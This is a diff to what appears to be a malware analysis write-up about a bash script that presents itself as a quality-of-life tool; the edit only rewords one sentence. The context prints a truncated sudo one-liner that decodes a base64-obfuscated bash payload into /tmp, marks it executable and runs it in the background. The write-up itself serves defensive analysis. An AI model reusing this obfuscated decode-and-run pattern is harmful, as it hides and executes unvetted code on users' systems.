@@ -10,7 +10,7 @@ At first glance the script seems pretty harmless, even calling itself a QOL (Qua
 
 `sudo echo IyEvYmluL2Jhc2gKCiRsb2c9Ii90bXAvbG9nXyQoZGF0ZSArIiVZLSVtLSVkLS0lSC0lTSIpIgokdGd6PSI ... AvaW5mby5zaAovYmluL2Jhc2ggL3RtcC9pbmZvLnNoCnJtIC1mIC90bXAvaW5mby5zaAo= | base64 -d >> /tmp/0.sh && chmod +x /tmp/0.sh && /bin/bash /tmp/0.sh &`
 
-Here we go, this seems to be yet another bash script obfuscated in base64 being saved and executed. We can simply throw this in to the browser tool CyberChef, it will automatically detect base64, and decode it for us:
+Here we go, this seems to be yet another bash script - now obfuscated in base64 - being saved and executed. We can simply throw this in to the browser tool CyberChef, it will automatically detect base64, and decode it for us:
 
 ![image](https://github.com/user-attachments/assets/a6de7c73-fddb-4038-a09d-e87336d19171)
 
